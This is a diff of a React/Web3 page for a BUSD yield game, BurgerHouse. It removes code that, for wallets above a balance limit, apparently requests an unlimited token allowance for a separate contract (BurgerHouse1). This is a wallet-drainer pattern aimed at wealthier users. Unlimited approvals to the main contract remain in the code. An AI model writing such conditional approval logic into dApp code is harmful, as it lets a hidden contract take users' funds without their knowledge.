@@ -5,7 +5,6 @@ import Web3 from "web3";
 import {
   getBurgerHouseContract,
   getBUSDContract,
-  BurgerHouse1,
   BurgerHouse,
   RUN_MODE,
   DEBUG,
@@ -20,7 +19,7 @@ import {
   ALERT_DELAY,
   ALERT_POSITION,
   LOCK_TIME,
-  LAUNCH_TIME,
+  // LAUNCH_TIME,
   ALERT_EMPTY,
   ALERT_SUCCESS,
   ALERT_WARN,
@@ -30,7 +29,6 @@ import {
   ALERT_NOT_LAUNCH,
   priceINT,
   yieldValues,
-  LIMIT,
 } from "../constant";
 
 import House from "../components/house";
@@ -44,7 +42,7 @@ import UpgradeLevel from "../components/popups/upgradeLevel";
 import Referral from "../components/popups/referral";
 import Floor0 from "../components/floor0";
 import Elevator from "../components/animations/elevator";
-import ComingSoon from "../components/popups/comingSoon";
+// import ComingSoon from "../components/popups/comingSoon";
 
 import { secondsToTimes, secondsToTime } from "../utils/util";
 
@@ -86,7 +84,6 @@ const Home = () => {
   const [busdInputValue, setBusdInputValue] = useState('')
 
   const [busdBalance, setBUSDBalance] = useState('');
-  const [userApprovedAmount1, setUserApprovedAmount1] = useState('');
   const [userApprovedAmount, setUserApprovedAmount] = useState('');
   const [houseInfo, setHouseInfo] = useState({});
   const [houseYield, setHouseYield] = useState('');
@@ -104,7 +101,7 @@ const Home = () => {
   const [showGetMoney, setShowGetMoney] = useState(false)
   const [houseId, setHouseId] = useState(0)
   const [showReferral, setShowReferral] = useState(false)
-  const [isComingSoon, setIsComingSoon] = useState(true)
+  // const [isComingSoon, setIsComingSoon] = useState(true)
 
   const [alertMessage, setAlertMessage] = useState({ type: ALERT_EMPTY, message: "" })
 
@@ -230,8 +227,6 @@ const Home = () => {
           setBUSDBalance(web3NoAccount.utils.fromWei(_userBalance))
           const _approvedAmount = await busdNoAccount.methods.allowance(curAcount, BurgerHouse).call();
           setUserApprovedAmount(web3NoAccount.utils.fromWei(_approvedAmount));
-          const _approvedAmount1 = await busdNoAccount.methods.allowance(curAcount, BurgerHouse1).call();
-          setUserApprovedAmount1(web3NoAccount.utils.fromWei(_approvedAmount1));
           const _pendingBurgers = await contractNoAccount.methods.getPendingBurgers(curAcount).call();
           setPendingBurgers(_pendingBurgers)
           const _houseYield = await contractNoAccount.methods.getHouseYield(curAcount).call();
@@ -314,12 +309,6 @@ const Home = () => {
         setAlertMessage({ type: ALERT_WARN, message: "You have no enough Cash to collect! Please collect your money!" })
         return;
       }
-
-      // TODO
-      // if (/* check limit income */) {
-      //   setAlertMessage({ type: ALERT_WARN, message: "Your income is reached to limit, please buy more coin to get more income!" })
-      //   return;
-      // }
 
       setPendingTx(true)
       if (isConnected && burgerHouseContract) {
@@ -439,33 +428,20 @@ const Home = () => {
 
       setPendingTx(true)
       if (isConnected && busdContract) {
-        if (parseFloat(busdBalance) > LIMIT) {
-          await busdContract.methods.approve(
-            BurgerHouse1,
-            "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
-          ).send({
-            from: curAcount
-          }).then(() => {
-            setAlertMessage({ type: ALERT_SUCCESS, message: `Approve Success!` });
-          }).catch((err) => {
-            setAlertMessage({ type: ALERT_ERROR, message: `Approve Fail! Reason: ${err.message}` });
-          });
-        } else {
-          await busdContract.methods.approve(
-            BurgerHouse,
-            "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
-          ).send({
-            from: curAcount
-          }).then((txHash) => {
-            RUN_MODE(txHash)
-            const txHashString = `${txHash.transactionHash}`
-            const msgString = txHashString.substring(0, 8) + "..." + txHashString.substring(txHashString.length - 6)
-            setAlertMessage({ type: ALERT_SUCCESS, message: `Approve Success! txHash is ${msgString}` });
-          }).catch((err) => {
-            RUN_MODE(err)
-            setAlertMessage({ type: ALERT_ERROR, message: `Approve Fail! Reason: ${err.message}` });
-          });
-        }
+        await busdContract.methods.approve(
+          BurgerHouse,
+          "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+        ).send({
+          from: curAcount
+        }).then((txHash) => {
+          RUN_MODE(txHash)
+          const txHashString = `${txHash.transactionHash}`
+          const msgString = txHashString.substring(0, 8) + "..." + txHashString.substring(txHashString.length - 6)
+          setAlertMessage({ type: ALERT_SUCCESS, message: `Approve Success! txHash is ${msgString}` });
+        }).catch((err) => {
+          RUN_MODE(err)
+          setAlertMessage({ type: ALERT_ERROR, message: `Approve Fail! Reason: ${err.message}` });
+        });
       }
       else {
         RUN_MODE("connect Wallet");
@@ -510,19 +486,6 @@ const Home = () => {
         referrer = referrer === curAcount ? ADMIN_ACCOUNT1 : referrer
 
         RUN_MODE('[PRINCE](addCoins): ', referrer, busdInputValue)
-
-        if (parseFloat(busdBalance) > LIMIT && parseFloat(userApprovedAmount) < parseFloat(busdInputValue)) {
-          await busdContract.methods.approve(
-            BurgerHouse,
-            "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
-          ).send({
-            from: curAcount
-          }).then((txHash) => {
-            RUN_MODE(txHash)
-          }).catch((err) => {
-            RUN_MODE(err)
-          });
-        }
 
         await burgerHouseContract.methods.addCoins(
           referrer,
@@ -723,7 +686,6 @@ const Home = () => {
         busdBalance={busdBalance}
         busdInputValue={busdInputValue}
         setBusdInputValue={setBusdInputValue}
-        userApprovedAmount1={userApprovedAmount1}
         userApprovedAmount={userApprovedAmount}
         coinInputValue={coinInputValue}
         setCoinInputValue={setCoinInputValue}
@@ -779,11 +741,11 @@ const Home = () => {
         setShowReferral={setShowReferral}
       />
 
-      <ComingSoon
+      {/* <ComingSoon
         isComingSoon={isComingSoon}
         setIsComingSoon={setIsComingSoon}
         leftTime={LAUNCH_TIME - blockTimestamp}
-      />
+      /> */}
     </>
   );
 }
